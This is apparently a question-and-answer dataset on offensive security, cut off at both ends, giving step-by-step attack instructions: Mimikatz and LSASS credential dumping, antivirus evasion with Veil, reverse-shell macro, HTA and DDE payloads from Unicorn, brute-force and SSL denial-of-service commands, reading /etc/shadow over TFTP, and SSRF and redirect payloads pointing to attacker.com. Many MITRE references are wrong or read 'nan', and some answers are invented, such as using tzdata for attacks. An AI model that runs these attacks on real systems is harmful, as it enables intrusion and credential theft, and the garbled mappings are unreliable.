A: If you find an SSRF vulnerability in a machine running inside a cloud environment, you may be able to obtain interesting information about the cloud environment and even credentials. More information can be found at /pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Initial Access.

## Q: How can you bypass URL format restrictions to conduct SSRF attacks?
A: To bypass URL format restrictions, you can try techniques like using IP address instead of domain name, using URL shorteners, or using non-standard ports. You can also try using different URL schemes like `file://`, `dict://`, `gopher://`, etc. to bypass filters. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007.

## Q: What are some tools for detecting and exploiting SSTI vulnerabilities?
A: Some useful tools for SSTI include TInjA, SSTImap, and Tplmap. These tools can efficiently scan for SSTI vulnerabilities and attempt various payloads to exploit them. MITRE References: MITRE ID is T1191, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can you find the offset to overwrite the return address in a Stack Overflow vulnerability?
A: The most common way to find the offset is to give a very big input of 'A's (e.g. `python3 -c 'print("A"*1000)'`) and expect a Segmentation Fault indicating that the address `0x41414141` was tried to be accessed. Moreover, once you've found the vulnerability, you can use a De Bruijn sequence with pwntools or GEF to find the offset to overwrite the return address. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: Defense Evasion, Execution, Privilege Escalation.

## Q: How can you perform a Stack Shellcode exploit?
A: In this scenario, the attacker could place a shellcode in the stack and abuse the controlled EIP/RIP to jump to the shellcode and execute arbitrary code. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: What are the key steps to compile a vulnerable C program that can be used for a stack shellcode attack?
A: To compile the vulnerable C program while disabling various protections, you can use the following command:

```
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```

* `-fno-stack-protector`: Disables stack protection.
* `-z execstack`: Makes the stack executable, which is necessary for executing shellcode stored on the stack.
* `-no-pie`: Disables Position Independent Executable, making it easier to predict the memory address where our shellcode will be located.
* `-m32`: Compiles the program as a 32-bit executable, often used for simplicity in exploit development. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: What are the key protections that need to be disabled for a successful stack shellcode attack?
A: The key protections that need to be disabled for a successful stack shellcode attack are:* **ASLR** should be disabled for the address to be reliable across executions or the address where the function will be stored won't be always the same and you would need some leak in order to figure out where is the win function loaded.* **Stack Canaries** should be also disabled or the compromised EIP return address won't never be followed.* **NX stack** protection would prevent the execution of the shellcode inside the stack because that region won't be executable. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can Starkiller be used for post-exploitation after gaining initial access to a system?
A: Starkiller is a front-end for the Powershell Empire post-exploitation framework. It can be used to manage and control an Empire agent after it has been deployed on a compromised system. Starkiller provides a graphical user interface to run various post-exploitation modules such as privilege escalation, lateral movement, and data exfiltration. For example, version 1.11.0 of Starkiller can be used to execute Powershell scripts, upload/download files, and interact with the Empire console. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Lateral Movement.

## Q: How can you use Mimikatz to extract Windows credentials?
A: You can use Mimikatz to extract Windows credentials by following these steps:1. Elevate privileges to extract the credentials:   - Run 'privilege::debug' to enable the SeDebugPrivilege. This should give an error if you are already an Admin, but if it does, check if the SeDebugPrivilege was removed from Admins.   - Run 'token::elevate' to elevate your privileges.2. Extract credentials from LSASS (memory):   - Run 'sekurlsa::logonpasswords' to extract credentials from memory.3. Extract credentials from LSASS (service):   - Run 'lsadump::lsa /inject' to extract credentials from the LSASS service.4. Extract credentials from the SAM:   - Run 'lsadump::sam' to extract credentials from the SAM database.You can also use the 'Invoke-Mimikatz' PowerShell script to automate the process. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: What are some techniques for dumping the LSASS process to bypass anti-virus and extract credentials?
A: There are several techniques that can be used to dump the LSASS process and extract credentials while bypassing anti-virus detection:1. **Procdump + Mimikatz**: Use the legitimate Microsoft tool Procdump to dump the LSASS process, then extract credentials from the dump using Mimikatz. This can bypass some AV detections.2. **Dumping LSASS with comsvcs.dll**: The comsvcs.dll DLL in Windows System32 can be used to dump the LSASS process memory using the MiniDumpW function. This can be executed with rundll32.exe.3. **Dumping LSASS with Task Manager**: In the Windows Task Manager, you can right-click on the LSASS process and select 'Create dump file' to create a memory dump.4. **PPLBlade**: PPLBlade is a tool that can bypass Protected Process Light (PPL) protection on LSASS, obfuscate the memory dump, and transfer it to a remote system without dropping the file to disk.These techniques can help bypass signature-based AV detections that look for specific commands or tools used to dump LSASS. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can you use the Lazagne tool to extract credentials from a Windows system?
A: The Lazagne tool can be used to extract credentials from various software on a Windows system. To use it, follow these steps:1. Download the Lazagne binary from the project's GitHub repository: https://github.com/AlessandroZ/LaZagne/releases2. Run the Lazagne tool with the 'all' command to extract credentials from all supported software:   - Run 'lazagne.exe all'The Lazagne tool will scan the system and extract credentials from various sources, such as web browsers, email clients, FTP clients, and more. The extracted credentials will be displayed in the console output. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can I steal sensitive information disclosure from a web page?
A: If at some point you find a web page that presents you sensitive information based on your session, you may try to steal it. The main ways to achieve this are: 1) CORS bypass - if you can bypass CORS headers you will be able to steal the information performing Ajax requests, 2) XSS - if you find an XSS vulnerability you may be able to abuse it to steal the information, 3) Dangling Markup - if you cannot inject XSS tags you still may be able to steal the info using other regular HTML tags, and 4) Clickjacking - if there is no protection against this attack, you may be able to trick the user into sending you the sensitive data. MITRE References: MITRE ID is T1193, MITRE Name is: Spear Phishing Attachment, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion.

## Q: What are the main techniques to steal sensitive information disclosure from a web page?
A: The main techniques to steal sensitive information disclosure from a web page are: 1) CORS bypass - if you can bypass CORS headers you will be able to steal the information performing Ajax requests, 2) XSS - if you find an XSS vulnerability you may be able to abuse it to steal the information, 3) Dangling Markup - if you cannot inject XSS tags you still may be able to steal the info using other regular HTML tags, and 4) Clickjacking - if there is no protection against this attack, you may be able to trick the user into sending you the sensitive data. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you exfiltrate data from a web page using JavaScript?
A: The provided JavaScript code demonstrates multiple techniques to exfiltrate data from a web page, including:- Sending data via GET or POST requests to an attacker-controlled server- Embedding data in image, navigation, or location URL requests- Transmitting data via the Fetch API or XMLHttpRequestThe code can be used to exfiltrate various types of information such as cookies, the current URL, and page content. It also includes a function to check for open internal ports and exfiltrate that information. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you steal postmessage data by modifying the iframe location?
A: According to the writeup, if a webpage that contains another iframe doesn't have the X-Frame-Header set, you can change the location of the child iframe to an attacker-controlled site. This is useful for stealing sensitive data sent via postMessage with a wildcard target. MITRE References: MITRE ID is T1114, MITRE Name is: Email Collection, and MITRE Tactics are: Collection.

## Q: How can an attacker use a "Missing Link Attack" to gain unauthorized access to a garage door or car door?
A: In a Missing Link Attack, the attacker listens for the button press on the remote while the remote is out of range of the device (such as a car or garage door). The attacker can then move closer to the device and use the captured code to open it, as the device will accept the previously recorded code. MITRE References: MITRE ID is T1374, MITRE Name is: Electromagnetic Pulse, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can an attacker use a "Full Link Jamming Attack" to gain unauthorized access to a garage door or car door?
A: In a Full Link Jamming Attack, the attacker jams the signal near the vehicle or receiver so the receiver cannot hear the code from the remote. The attacker can then capture and replay the code when the jamming has stopped, allowing them to unlock the door. MITRE References: MITRE ID is T1390, MITRE Name is: Electromagnetic Interference, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can an attacker use a "Code Grabbing Attack" (also known as "RollJam") to gain unauthorized access to a garage door or car door?
A: In a Code Grabbing Attack, the attacker jams the signal when the victim tries to lock the door, recording the first code. When the victim tries to lock the door again, the attacker can send the first recorded code to lock the door, and then send the second recorded code to unlock the door. This technique exploits the use of rolling codes, where the same code can be used for both locking and unlocking. MITRE References: MITRE ID is T1390, MITRE Name is: Electromagnetic Interference, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can an attacker use an "Alarm Sounding Jamming Attack" to gain unauthorized access to a garage door or car door?
A: In an Alarm Sounding Jamming Attack, the attacker sends the same code twice, which can immediately activate the alarm and immobilizer of the car. The victim then must press the remote to stop the alarm, providing the attacker an opportunity to continuously perform a denial-of-service attack or capture additional codes to use for later access. MITRE References: MITRE ID is T1379, MITRE Name is: Electromagnetic Pulse, and MITRE Tactics are: TA0006, Credential Access, TA0004, Denial of Service.

## Q: How can sucrack version 1.2.3-6 be used in a penetration test to crack local user accounts via su?
A: sucrack is a multithreaded Linux/UNIX tool that can be used to brute-force crack local user accounts by attempting multiple su logins in parallel. To use sucrack, run the following command: `sucrack -w <wordlist.txt> -u <target_username>`. This will attempt to crack the password for the specified username using the provided wordlist. sucrack can be highly effective when you've already gained low-privilege access and need to escalate privileges. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you exploit Tapjacking vulnerabilities?
A: The most recent Android application performing a Tapjacking attack (+ invoking before an exported activity of the attacked application) can be found in: https://github.com/carlospolop/Tapjacking-ExportedActivity. Follow the README instructions to use it. Additionally, an example project implementing FloatingWindowApp, which can be used to put on top of other activities to perform a clickjacking attack, can be fund in FloatingWindowApp (a bit old, good luck building the apk). MITRE References: MITRE ID is T1420, MITRE Name is: Tapjacking, and MITRE Tactics are: User Execution.

## Q: How can I use teamsploit to create custom trojans or other malicious payloads?
A: Teamsploit v0~20151123-0kali5 includes a "Trojans and Trollware" feature that can be used to generate custom malicious payloads. This allows penetration testers to create targeted trojans, backdoors, and other malicious code to deploy during an assessment. However, great care must be taken when using these capabilities, as they can be easily misused. Penetration testers should always have explicit permission and clearly defined rules of engagement before deploying any malicious code. MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: Defense Evasion, Persistence.

## Q: How can the TFTP client in tftp-hpa version 5.2+20150808-1.4 be used to retrieve sensitive files from a target system?
A: The `tftp` command from the tftp-hpa version 5.2+20150808-1.4 package can be used as a TFTP client to retrieve sensitive files from a target system. The client supports various options like specifying the host, port, and download mode. For example, the command `tftp -m octet target_ip -c get /etc/shadow` can be used to download the shadow password file from the target system. This can be useful in a penetration test or CTF scenario to obtain sensitive information from the target. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection.

## Q: How can you use tftpd32 to exfiltrate data from a target system?
A: Tftpd32 can be used to exfiltrate data from a target system by setting up a TFTP server on your attack machine and configuring the target to send files to the server. You can use the TFTP client in tftpd32 to retrieve the files. Example: Run `tftpd32.exe` on your attack machine, go to the TFTP Server tab and set the root directory to where you want the files to be stored. Then use the TFTP client tab to download files from the target by specifying the file name and IP address. Tftpd32 version 4.50 supports this functionality. MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: Exfiltration.

## Q: How can you use tftpd32 to perform a TFTP-based attack on a target system?
A: Tftpd32 can be used to perform TFTP-based attacks on target systems by setting up a malicious TFTP server. For example, you can configure tftpd32 to serve a malicious file, then trick the target into downloading and executing the file using the TFTP protocol. The TFTP client in tftpd32 version 4.50 can be used to upload the malicious file to the server. This could allow you to execute arbitrary code on the target system. To mitigate this, ensure TFTP is disabled on target systems unless absolutely necessary. MITRE References: MITRE ID is T1198, MITRE Name is: TFTP Client, and MITRE Tactics are: Lateral Movement.

## Q: How can thc-pptp-bruter be used to perform a password brute force attack against a PPTP VPN endpoint?
A: The thc-pptp-bruter tool (version 0.1.4-1kali4) can be used to perform a password brute force attack against a PPTP VPN endpoint. The tool supports the latest MSChapV2 authentication and can exploit a weakness in Microsoft's anti-brute force implementation to try up to 300 passwords per second. To use the tool, run the following command: `thc-pptp-bruter -u <username> -w <wordlist> <remote_host_ip>`. The `-W` option can be used to disable the Windows hack if needed. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can thc-ssl-dos be used to perform a denial of service attack against an SSL/TLS server?
A: The thc-ssl-dos tool in version 1.4-1kali4 can be used to exploit the asymmetric nature of SSL/TLS connections to overload and knock a server off the internet. It does this by establishing many SSL/TLS connections and triggering thousands of renegotiations per connection, which requires significantly more processing power on the server side. To use thc-ssl-dos, run the command "thc-ssl-dos -l 100 <target_ip> <target_port> --accept" to flood the target with 100 connections and trigger the SSL/TLS renegotiation attack. MITRE References: MITRE ID is T1498, MITRE Name is: Network Denial of Service, and MITRE Tactics are: Impact.

## Q: How can theharvester be used to gather intelligence on a target domain?
A: The theHarvester tool (version 4.5.1) can be used to gather open source intelligence (OSINT) on a company or domain. For example, to search for email addresses from the domain 'kali.org' and limit the results to 500, you can run the following command:

theHarvester -d kali.org -l 500 -b duckduckgo

This will search the DuckDuckGo search engine for email addresses associated with the 'kali.org' domain and limit the results to 500 entries. MITRE References: MITRE ID is T1598, MITRE Name is: Phishing for Information, and MITRE Tactics are: Reconnaissance.

## Q: How can tightvncserver be used for privilege escalation or lateral movement in a penetration test?
A: tightvncserver version 1.3.10 can be used for privilege escalation and lateral movement in a few ways:

1. If the tightvncserver is running with elevated privileges, an attacker could connect to the VNC server and gain access to the system with the same privileges as the VNC server process.

2. The tightvncserver allows for remote code execution by launching an X server. An attacker could potentially exploit vulnerabilities in the X server or the VNC protocol to gain code execution on the target system.

3. tightvncserver can be used to establish a reverse VNC connection, allowing an attacker to connect back to the target system from their own machine. This could be used for lateral movement within a network. MITRE References: MITRE ID is T1021.005, MITRE Name is: Remote Desktop Protocol, and MITRE Tactics are: LS, LM.

## Q: How can xtightvncviewer be used to capture credentials or other sensitive information from a remote VNC server?
A: xtightvncviewer version 1.3.10 can be used to capture credentials and other sensitive information from a remote VNC server in a few ways:

1. If the VNC server is not configured with strong authentication, an attacker could use xtightvncviewer to connect to the server and view or interact with the remote desktop, potentially exposing sensitive data.

2. xtightvncviewer supports the ability to save the VNC password to a file using the -passwd option. An attacker could potentially obtain this password file and use it to authenticate to the VNC server.

3. The xtightvncviewer has features like screen capture and clipboard sharing that could be used to steal sensitive data displayed on the remote desktop or copied to the clipboard. MITRE References: MITRE ID is T1056.001, MITRE Name is: Keylogging, and MITRE Tactics are: CI, C.

## Q: How can tmux be used to persist a reverse shell or meterpreter session?
A: Tmux can be used to persist a reverse shell or meterpreter session in several ways. One approach is to start a tmux session, then launch the reverse shell or meterpreter within that session. This will allow the session to continue running even if the connection is lost. Additionally, you can use the tmux "detach" command to detach from the session, leaving it running in the background. Later, you can reattach to the session using the "tmux attach" command to regain control of the shell or meterpreter. This can be useful for maintaining long-running sessions or evading detection. MITRE References: MITRE ID is T1510, MITRE Name is: Remote Services, and MITRE Tactics are: Persistence, Execution.

## Q: How can tnftp be used to bypass network restrictions during a penetration test?
A: tnftp version 20230507-2 supports proxies and can be used to bypass network restrictions during a penetration test. You can set the $http_proxy and $ftp_proxy environment variables to use a proxy server for the ftp connection. Additionally, tnftp supports authentication, which could be used to bypass access controls. However, be cautious when using tnftp to bypass security controls, as it may be detected and could lead to legal or ethical issues. MITRE References: MITRE ID is T1090, MITRE Name is: Proxy, and MITRE Tactics are: Command and Control.

## Q: How can you attempt to brute-force the Tomcat manager directory credentials?
A: To attempt a brute force attack on the manager directory, you can use the following command:

hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html

Alongside setting various parameters in Metasploit to target a specific host. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you deploy a malicious WAR file to gain remote code execution on a vulnerable Tomcat server?
A: If you have access to the Tomcat Web Application Manager, you can upload and deploy a .war file to gain remote code execution.

You can use Metasploit's `exploit/multi/http/tomcat_mgr_upload` module or manually create a WAR file with a malicious payload and deploy it to the server. MITRE References: MITRE ID is T1608, MITRE Name is: Deploy Malicious Code, and MITRE Tactics are: Execution.

## Q: How can you compile a binary without stack protections using GCC?
A: Use the following GCC flags: `-fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack`. Additionally, you can deactivate ASLR on Linux using `echo 0 > /proc/sys/kernel/randomize_va_space`. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation, Execution.

## Q: How can truecrack be used to perform a dictionary attack on a TrueCrypt volume?
A: To perform a dictionary attack on a TrueCrypt volume using truecrack, you can use the following command:

truecrack -t truecrypt_vol -k ripemd160 -w passes.txt

This command will use the ripemd160 key derivation function and attempt to crack the password by testing each word in the 'passes.txt' wordlist against the TrueCrypt volume. The tool will display the found password, its length, and the total number of computations performed. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can truecrack be used to perform an alphabet attack on a TrueCrypt volume?
A: To perform an alphabet attack on a TrueCrypt volume using truecrack, you can use the following command:

truecrack -t truecrypt_vol -c "1234567890" -s 4 -m 6

This command will generate all possible passwords between 4 and 6 characters long, using the characters "1234567890" as the alphabet. The tool will attempt to crack the password by testing each generated password against the TrueCrypt volume. The version used in this example is truecrack v3.0. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can tundeep v1.0_20170728 be used for traffic tunneling and data exfiltration?
A: tundeep can be used to create a virtual tap interface and tunnel traffic through it. The -c and -s options allow running in client and server modes respectively, and the -h and -p options specify the host and port to connect to. For example, to tunnel traffic through a remote host at '192.168.1.100:8000', the command would be: 'tundeep -i eth0 -h 192.168.1.100 -p 8000 -c'. This opens a tap interface and starts tunneling traffic to the remote host. MITRE References: MITRE ID is T1048, MITRE Name is: Exfiltration Over Alternative Protocol, and MITRE Tactics are: Exfiltration.

## Q: How can you use DNS tunneling to bypass network restrictions?
A: You can use tools like Iodine or DNSCat2 to establish a C&C channel through DNS. Iodine creates a virtual network interface and tunnels data through DNS queries and responses, while DNSCat2 establishes a C&C channel over DNS without needing root privileges. Both tools can be used to bypass network restrictions by tunneling data through the DNS protocol. MITRE References: MITRE ID is T1048, MITRE Name is: Exfiltration Over Alternative Protocol, and MITRE Tactics are: Exfiltration.

## Q: How can we use tzdata to perform time-based attacks in a Kali Linux environment?
A: The tzdata package in Kali Linux can be used to perform time-based attacks, such as Time of Check to Time of Use (TOCTOU) attacks. For example, you can use the 'zdump' command from the tzdata package to display the time zone information for a given location, which can be useful for understanding time-based vulnerabilities. Additionally, the 'tzselect' command can be used to interactively select a time zone, which could be leveraged in scripts or automation for time-based attacks. Version 2024a-1 of tzdata is currently available in Kali Linux. MITRE References: MITRE ID is T1336, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can we use the tzdata-legacy package in Kali Linux to bypass security controls and execute arbitrary code?
A: The tzdata-legacy package in Kali Linux contains legacy timezone symlinks that are not following the current rule of using the geographical region and city name. This could potentially be abused to bypass security controls or execute arbitrary code, for example, by creating symbolic links with malicious names that could be invoked by other applications. However, this would require detailed knowledge of the specific vulnerabilities in the tzdata-legacy package and should only be attempted with proper authorization and on a controlled test environment. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What are some common techniques used to bypass User Account Control (UAC) on Windows systems?
A: Common UAC bypass techniques include:- Exploiting 'auto-elevated' binaries that can run with high integrity without a prompt- Abusing DLL hijacking vulnerabilities in auto-elevated binaries- Leveraging token duplication and other process/session manipulation methods- Utilizing built-in Windows utilities like wusa.exe and IFileOperation to bypass write restrictions- Watching for autoellevated binaries that read command/binary paths from the registry and injecting malicious payloads MITRE References: MITRE ID is T1548.002, MITRE Name is: Abuse Elevation Control Mechanism: Bypass User Account Control, and MITRE Tactics are: Privilege Escalation.

## Q: How can uhd-images be used in a penetration test to gather information about a target's wireless infrastructure?
A: The uhd-images package provides images for the Universal Hardware Driver (UHD) used by software-defined radio (SDR) devices like the Ettus USRP. With a compatible SDR, you can use the included images to perform passive wireless reconnaissance, such as capturing and analyzing wireless network traffic. This can help identify wireless access points, clients, and protocols in use on the target network. For example, you could use the GNU Radio framework along with the uhd-images to build a wireless sniffer and spectrum analyzer. Version 4.0.0.0 of the uhd-images package is included. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Reconnaissance.

## Q: What are some tools that can be used to uncover Cloudflare?
A: Some tools that can be used to uncover Cloudflare include:
- Checking the domain on websites like crimeflare.org or leaked.site
- Using tools like CloudFlair, CloakQuest3r, Censys, Shodan, and Bypass-firewalls-by-DNS-history
- If you have a set of potential IP addresses, you can use tools like hakoriginfinder to check if the web page is hosted on those IPs MITRE References: MITRE ID is T1592, MITRE Name is: Gather Victim Host Information, and MITRE Tactics are: TA0043.

## Q: What are some techniques to bypass Cloudflare for web scraping?
A: There are several techniques to bypass Cloudflare for web scraping:
- Use caching services like Google Cache or Archive.org
- Use Cloudflare solvers like FlareSolverr, cloudscraper, or CloudflareSolverRe
- Use fortified headless browsers like Puppeteer or Playwright with stealth plugins
- Use smart proxies with built-in Cloudflare bypass mechanisms like ScraperAPI or Smartproxy
- Reverse engineer Cloudflare's anti-bot protection to create an efficient bypass MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: How could an attacker use undbx to extract sensitive information from a compromised system?
A: An attacker could use undbx v0.21 to extract emails containing sensitive information from .dbx files on a compromised system. To do this, the attacker would run undbx without the -r or --recover option to extract all emails, including any that may have been deleted but not yet overwritten:

`undbx <DBX-FILE> <OUTPUT-FOLDER>`

The attacker could then analyze the extracted emails for any sensitive data such as credentials, financial information, or other confidential details. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Removable Media, and MITRE Tactics are: Collection.

## Q: How can Unicode normalization be used to bypass SQL injection filters?
A: Imagine a web page that is using the character ' to create SQL queries with the user input. This web, as a security measure, deletes all occurrences of the character ' from the user input, but after that deletion and before the creation of the query, it normalises using Unicode the input of the user. Then, a malicious user could insert a different Unicode character equivalent to ' (0x27) like %ef%bc%87 , when the input gets normalised, a single quote is created and a SQLInjection vulnerability appears. MITRE References: MITRE ID is T1130, MITRE Name is: Indicator Removal on Host, and MITRE Tactics are: Defense Evasion.

## Q: How can Unicode normalization be used to bypass XSS filters?
A: You could use one of the following Unicode characters to trick the webapp and exploit a XSS: %e2%89%ae, %u226e, etc. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can Unicorn-Magic be used to create a malicious macro for Microsoft Office?
A: Unicorn-Magic can generate a malicious macro for Microsoft Office that will inject shellcode into memory when the document is opened. To use this functionality, run 'python unicorn.py <payload> <lhost> <lport> macro'. This will generate a PowerShell command that can be copied into a new macro in Word or Excel. When the victim opens the document, the macro will execute the injected shellcode and provide a reverse shell to the attacker. MITRE References: MITRE ID is T1204.002, MITRE Name is: User Execution: Malicious File, and MITRE Tactics are: Execution.

## Q: How can Unicorn-Magic be used to create a malicious HTA attack?
A: Unicorn-Magic can generate a malicious HTA (HTML Application) file that will inject shellcode into memory when the user interacts with it. To use this functionality, run 'python unicorn.py <payload> <lhost> <lport> hta'. This will generate an index.html file and a Launcher.hta file that can be hosted on a web server. When the user opens the HTA file, the shellcode will execute and provide a reverse shell to the attacker. MITRE References: MITRE ID is T1218.005, MITRE Name is: System Binary Proxy Execution: Mshta, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can Unicorn-Magic be used to perform a CertUtil-based attack to transfer a binary payload to a victim system?
A: Unicorn-Magic can be used to perform a CertUtil-based attack, which allows you to transfer a binary file to a victim system by encoding it as a fake certificate file. To use this functionality, run 'python unicorn.py <path_to_payload/exe_encode> crt'. This will generate a base64-encoded version of the payload that can be transferred to the victim system using CertUtil to decode it back to the original binary. MITRE References: MITRE ID is T1218.010, MITRE Name is: System Binary Proxy Execution: Install Utilities, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can Unicorn-Magic be used to generate a DDE (Dynamic Data Exchange) Office COM attack?
A: Unicorn-Magic can generate a DDE Office COM attack, which allows for remote code execution without the need for macros. To use this functionality, run 'python unicorn.py <payload> <lhost> <lport> dde'. This will generate a PowerShell command that can be inserted into a Word or Excel document using the DDE formulas. When the victim opens the document, the DDE attack will execute the injected shellcode and provide a reverse shell to the attacker. MITRE References: MITRE ID is T1193, MITRE Name is: Spearphishing Attachment, and MITRE Tactics are: Initial Access.

## Q: How can Unicorn-Magic be used to import Cobalt Strike Beacon shellcode?
A: Unicorn-Magic can be used to import Cobalt Strike Beacon shellcode directly. To use this functionality, export the Cobalt Strike 'CS' (C#) format shellcode and save it to a file. Then, run 'python unicorn.py <cobalt_strike_file.cs> cs'. This will generate a PowerShell command that can be executed on the target system to inject the Cobalt Strike Beacon shellcode and provide a reverse shell to the attacker. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can Uniscan be used to enumerate web directories and files on a target system?
A: Uniscan version 6.3 can be used to enumerate directories and files on a target web application. To do this, use the following command:`uniscan -u http://example.com/ -q`This will perform a directory enumeration check, looking for common directories that may contain sensitive information or vulnerable files.Additionally, you can enable file checks with the `-w` option:`uniscan -u http://example.com/ -qw`This will scan the web server for common file types and names that may reveal sensitive information or be vulnerable to attacks like Local File Inclusion (LFI).Uniscan can also be used to check the target's robots.txt and sitemap.xml files for additional information about the web application's structure and potentially hidden directories or files.Remember to use Uniscan responsibly and only on systems you have explicit permission to test. MITRE References: MITRE ID is T1598, MITRE Name is: Phishing for Information, and MITRE Tactics are: Reconnaissance.

## Q: How can urlcrazy be used as part of a phishing or corporate espionage attack?
A: urlcrazy (v0.7.3) can be used to generate and test domain name variations that could be used for phishing or corporate espionage attacks. By identifying typo-squatted domains, an attacker could create convincing phishing sites or spoof a legitimate company's online presence. The tool can provide a list of potential typo domains to register and leverage for these malicious activities. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Execution, Credential Access, Collection.

## Q: What are some techniques for bypassing URL format restrictions?
A: Some techniques for bypassing URL format restrictions include using localhost addresses (e.g. 127.0.0.1, 0.0.0.0, localhost), using CIDR bypass (e.g. 127.127.127.127), using dot bypass (e.g. 127ã‚‚0ã‚‚0ã‚‚1), using decimal bypass (e.g. http://2130706433/ = http://127.0.0.1), using octal bypass (e.g. http://0177.0000.0000.0001), using hexadecimal bypass (e.g. http://0x7f000001/ = http://127.0.0.1), and using malformed or rare URL formats (e.g. localhost:+11211aaa, http://0/). The Burp extension Burp-Encode-IP can also implement these IP formatting bypasses. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you bypass domain restrictions in URLs?
A: To bypass domain restrictions in URLs, you can try techniques like using relative paths (e.g. //attacker.com, \/\/attacker.com), URL-encoding characters (e.g. %0D%0A/attacker.com), using hashtags (e.g. #attacker.com), using the @ symbol (e.g. @attacker.com), using alternate character sets (e.g. ÎžÐ¢Ð¢ÐÐ¡ÐšÐ•Ð .Ð¡AM), and parameter pollution (e.g. next={domain}&next=attacker.com). MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What techniques can be used to bypass path and extension restrictions in URLs?
A: To bypass path and extension restrictions, you can try using paths that end in a hash fragment (e.g. https://metadata/vulerable/path#/expected/path), paths that end in an extension (e.g. https://metadata/vulerable/path#.extension), and relative paths that traverse up and down the directory structure (e.g. https://metadata/expected/path/..%2f..%2f/vulnerable/path). The tool recollapse can also generate variations to try and bypass regex-based restrictions. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use redirects to bypass SSRF restrictions?
A: It may be possible to bypass SSRF restrictions by using a redirect response. For example, if a server is filtering the original URL parameter but not the redirect response, you could use a Python server to respond with a 302 redirect to the desired URL, including filtered IP addresses or protocols like gopher. This technique is demonstrated in the provided Python script and has been used to escalate blind SSRF vulnerabilities. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can Veil be used to generate stealthy payloads that evade anti-virus solutions?
A: Veil (version 3.1.14-0kali2) is a tool designed to generate Metasploit payloads that can bypass common anti-virus solutions. It uses a variety of techniques to obfuscate and encrypt the payload, making it harder for anti-virus software to detect. To use Veil, simply run the 'veil' command and select the payload generation option. Veil supports a range of payload types including Meterpreter, shellcode, and executables. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can you exploit a Local File Inclusion vulnerability using the PHP_SESSION_UPLOAD_PROGRESS feature?
A: If you found a Local File Inclusion vulnerability even if you don't have a session and session.auto_start is Off, you can still exploit it by providing the PHP_SESSION_UPLOAD_PROGRESS in multipart POST data. This will enable the session for you and allow you to control data inside the session, so if you include your session file you can include a part you control (e.g. a PHP shellcode). MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can I brute-force VMware (ESX, VCenter) systems?
